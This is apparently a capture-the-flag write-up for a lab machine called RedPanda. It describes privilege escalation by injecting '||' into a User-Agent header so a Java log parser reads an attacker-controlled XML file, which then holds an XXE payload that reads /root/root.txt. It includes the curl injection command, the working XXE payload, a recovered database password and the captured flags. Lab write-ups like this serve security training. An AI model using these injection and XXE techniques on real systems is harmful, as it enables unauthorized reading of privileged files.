404||10.10.14.9||curl/7.74.0||/error
```

ok, testing some theories - after stuffing `/img/greg.jpg` in to `redpanda.log`:
```
woodenk@redpanda:~$ java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
/img/greg.jpg
Artist: woodenk
Exception in thread "main" java.io.FileNotFoundException: /credits/woodenk_creds.xml (Permission denied)
        at java.base/java.io.FileInputStream.open0(Native Method)
        at java.base/java.io.FileInputStream.open(FileInputStream.java:219)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:157)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:112)
        at java.base/sun.net.www.protocol.file.FileURLConnection.connect(FileURLConnection.java:86)
        at java.base/sun.net.www.protocol.file.FileURLConnection.getInputStream(FileURLConnection.java:184)
        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:652)
        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLVersionDetector.determineDocVersion(XMLVersionDetector.java:150)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:860)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:824)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1216)
        at java.xml/com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:635)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:217)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:277)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:264)
        at org.jdom2.input.SAXBuilder.build(SAXBuilder.java:1104)
        at com.logparser.App.addViewTo(App.java:67)
        at com.logparser.App.main(App.java:105)
```

and

```
woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log

404||10.10.14.9||curl/7.74.0||/home/woodenk/foo.jpg
404||10.10.14.9||curl/7.74.0||/error
woodenk@redpanda:~$ java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
/home/woodenk/foo.jpg
Exception in thread "main" java.io.FileNotFoundException: /opt/panda_search/src/main/resources/static/home/woodenk/foo.jpg (No such file or directory)
        at java.base/java.io.FileInputStream.open0(Native Method)
        at java.base/java.io.FileInputStream.open(FileInputStream.java:219)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:157)
        at com.drew.imaging.jpeg.JpegMetadataReader.readMetadata(JpegMetadataReader.java:90)
        at com.drew.imaging.jpeg.JpegMetadataReader.readMetadata(JpegMetadataReader.java:104)
        at com.logparser.App.getArtist(App.java:45)
        at com.logparser.App.main(App.java:102)
```

ok assumptions are correct

thinking more about this - since they have to read the XML in order to increment values, and don't see any perms management, we can prebuild the poisoned artist XML file with XXE.

`foo.jpg` currently points at `../foo`, which would translate to `/credits/../foo_creds.xml`, but we can't write to that either

so we really need to point at `../home/woodenk/foo`, which `/credits/../home/woodenk/foo_creds.xml`

and if we stage the XXE, we don't need to worry about perms problems. [foo_creds.xml](foo_creds.xml)

### code auditing ftw

```java
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap();
        map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        return map;
    }
```

shows that there is an injection point here:
  * a blind split on `||`
  * uri becomes strings[3]
  * but if user-agent is stuffed with `||` we can sidestep the path parsing on the input


and that's super helpful, since while we have sources for `LogParser` class, we don't have them for `panda_search`


this.. should work:

```
$ curl http://redpanda.htb:8080/it/doesnt/matter -H "User-Agent: curl/7.x.x||/../../../../../../home/woodenk/foo.jpg"
```

and it does. with the logs stuffed:
```
woodenk@redpanda:~$ tail -f /opt/panda_search/redpanda.log

404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error
404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error
404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error

```

running the logparser, get
```
woodenk@redpanda:~$ java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
/../../../../../../home/woodenk/foo.jpg
Artist: ../home/woodenk/foo
Exception in thread "main" java.io.FileNotFoundException: /credits/../home/woodenk/foo_creds.xml (Permission denied)
        at java.base/java.io.FileInputStream.open0(Native Method)
        at java.base/java.io.FileInputStream.open(FileInputStream.java:219)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:157)
        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:112)
        at java.base/sun.net.www.protocol.file.FileURLConnection.connect(FileURLConnection.java:86)
        at java.base/sun.net.www.protocol.file.FileURLConnection.getInputStream(FileURLConnection.java:184)
        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:652)
        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLVersionDetector.determineDocVersion(XMLVersionDetector.java:150)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:860)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:824)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)
        at java.xml/com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1216)
        at java.xml/com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:635)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:217)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:277)
        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:264)
        at org.jdom2.input.SAXBuilder.build(SAXBuilder.java:1104)
        at com.logparser.App.addViewTo(App.java:67)
        at com.logparser.App.main(App.java:105)
```

our uri/user-agent trick worked, it's reading a file we control. it finds the artist we expect, forms the filename.. and permission denied?

that relative path is definitely not writeable, while the direct is:
```
woodenk@redpanda:~$ cat /credits/../home/woodenk/foo_creds.xml
cat: /credits/../home/woodenk/foo_creds.xml: Permission denied
woodenk@redpanda:~$ ls -l foo_creds.xml
-rw-rw-r-- 1 woodenk woodenk 151 Jul 18 02:48 foo_creds.xml
```

since `root` is the one actually running, any `Permission denied` is questionable - but this feels like an FS/kernel.. and the file hasn't changed after the truncation cycle.

looking at `/opt/cleanup.sh`
```bash
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

it it removing `.xml` and `.jpg` from
  * `/tmp`
  * `/var/tmp`
  * `/dev/shm`
  * `/home/woodenk`

but if the issue is the relative path, they all have the same problem.

said we didn't have access to the source code for panda_search - this is not true. we don't have it via decompilation like we do for logparser, but the sources we care about are just on disk:
```
woodenk@redpanda:~$ ls /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/
MainController.java  PandaSearchApplication.java  RequestInterceptor.java
```

where are the descriptions of the pandas coming from? that's got to be the mysql endpoint(s), because they are not in the jpgs

from panda_search source:
  * how is `redpanda.log` being written?
  * how is mysql used?


and it would appear both answers are obtainable.

```
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

using that, get to
```
woodenk@redpanda:~$ mysql -p
mysql> show databases;
mysql> use red_panda;
mysql> show tables;
mysql> select * from pandas;
+----------+------------------------------------------------------------------------------------+------------------+---------+
| name     | bio                                                                                | imgloc           | author  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
| Smooch   | Smooch likes giving kisses and hugs to everyone!                                   | img/smooch.jpg   | woodenk |
| Hungy    | Hungy is always hungry so he is eating all the bamboo in the world!                | img/hungy.jpg    | woodenk |
| Greg     | Greg is a hacker. Watch out for his injection attacks!                             | img/greg.jpg     | woodenk |
| Mr Puffy | Mr Puffy is the fluffiest red panda to have ever lived.                            | img/mr_puffy.jpg | damian  |
| Florida  | Florida panda is the evil twin of Greg. Watch out for him!                         | img/florida.jpg  | woodenk |
| Lazy     | Lazy is always very sleepy so he likes to lay around all day and do nothing.       | img/lazy.jpg     | woodenk |
| Shy      | Shy is as his name suggest very shy. But he likes to cuddle when he feels like it. | img/shy.jpg      | damian  |
| Smiley   | Smiley is always very happy. She loves to look at beautiful people like you !      | img/smiley.jpg   | woodenk |
| Angy     | Angy is always very grumpy. He sticks out his tongue to everyone.                  | img/angy.jpg     | damian  |
| Peter    | Peter loves to climb. We think he was a spider in his previous life.               | img/peter.jpg    | damian  |
| Crafty   | Crafty is always busy creating art. They will become a very famous red panda!      | img/crafty.jpg   | damian  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
11 rows in set (0.00 sec)
```

but.. for woodenk, we only see `greg`, `hungy`, `smooch` and `smiley`, where are `florida` and `lazy` coming from?
similarly, for damian, we only see `angy`, `shy`, `crafty`, and `peter`, where is `mr_puffy` coming from?

the images do exist, but don't show up on the scoreboard. rabbit hole?

```java
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
```

if we are going the path of exfil via `export.xml`, then we can only use `woodenk` or `damian` as the author.


```java
    @Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}
```

and this is how `redpanda.log` is being built, nothing we didn't already know

also, it looks like the mysql instance running on 3306 has the same contents as the one running on 33060, so.. not a path either

```
mysql> insert into pandas values ('foo', "papa was a rolling stone", "../../../../../../../home/woodenk/foo.jpg", "woodenk");
ERROR 1406 (22001): Data too long for column 'imgloc' at row 1
```

### more reversing

built a stub version of LogParser to debug and see where things were going wrong
  * file has to exist
  * encoding must be set and correct
  * file contents have to match expectations

rather than building from scratch, exported `woodenk` stats, and got [export.xml](export.xml)

used that as a reference to build [foo_creds.xml](foo_creds.xml) with a basic XXE

did not see the flag in the file, so removed it to test the general flow, and

```
woodenk@redpanda:~$ cat foo_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
<author>../home/woodenk/foo</author>
<image>
  <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
  <views>1</views>
</image>
<totalviews>1</totalviews>
</credits>

... send in several curl requests for this image ...

woodenk@redpanda:~$ cat foo_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>../home/woodenk/foo</author>
  <image>
    <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
    <views>7</views>
  </image>
  <totalviews>7</totalviews>
</credits>

```

ok, we're on the right path - getting modifications to a file we control from root. now just need to figure out where the XXE fits in -- an arbitrary field?

```
woodenk@redpanda:~$ cat foo_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///root/root.txt" >]>
<credits>
<author>../home/woodenk/foo</author>
<image>
  <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
  <views>1</views>
</image>
<foo>&xxe;</foo>
<totalviews>1</totalviews>
</credits>

woodenk@redpanda:~$ cat foo_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>../home/woodenk/foo</author>
  <image>
    <uri>/../../../../../../home/woodenk/foo-conor.jpg</uri>
    <views>7</views>
  </image>
  <foo>1339eb76b4b95c3e1f29036af500188b</foo>
  <totalviews>7</totalviews>
</credits>
woodenk@redpanda:~$
```

awwwwwwwwwww yeah.

have to wait for the logs to get truncated, which happens every 2 minutes, but felt like a lot more than that. 



## flag

```
user:324c9fbcbc65d4032c4bda715a4955dc
root:1339eb76b4b95c3e1f29036af500188b
```
